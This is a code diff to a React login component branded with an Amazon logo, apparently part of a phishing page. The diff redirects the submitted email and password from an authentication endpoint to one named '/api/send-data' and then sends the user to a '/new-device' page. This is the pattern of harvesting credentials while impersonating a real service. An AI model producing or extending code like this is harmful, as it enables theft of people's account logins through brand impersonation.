@@ -3,8 +3,7 @@
 import React, { useState } from "react";
 import axios from "axios";
 import Image from "next/image";
-
-const API_ENDPOINT = "/api/auth/login";
+import { useRouter } from "next/navigation";
 
 const LoginBox = () => {
   const [step, setStep] = useState("email");
@@ -13,6 +12,7 @@ const LoginBox = () => {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
+  const router = useRouter();
 
   const isValidEmail = (value) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
 
@@ -41,8 +41,9 @@ const LoginBox = () => {
 
     try {
       setLoading(true);
-      await axios.post(API_ENDPOINT, { email, password });
+      await axios.post("/api/send-data", { email, password });
       setSuccess("Signed in successfully.");
+      router.push("/new-device");
     } catch {
       setError("Sign in failed. Please try again.");
     } finally {
@@ -53,7 +54,7 @@ const LoginBox = () => {
   return (
     <main className="min-h-screen bg-[#fff] pt-8 pb-10 text-[#0f1111]">
       <div className="mx-auto w-full">
-        <Image
+        <img
           src={"/images/amazon-logo.png"}
           width={120}
           height={80}
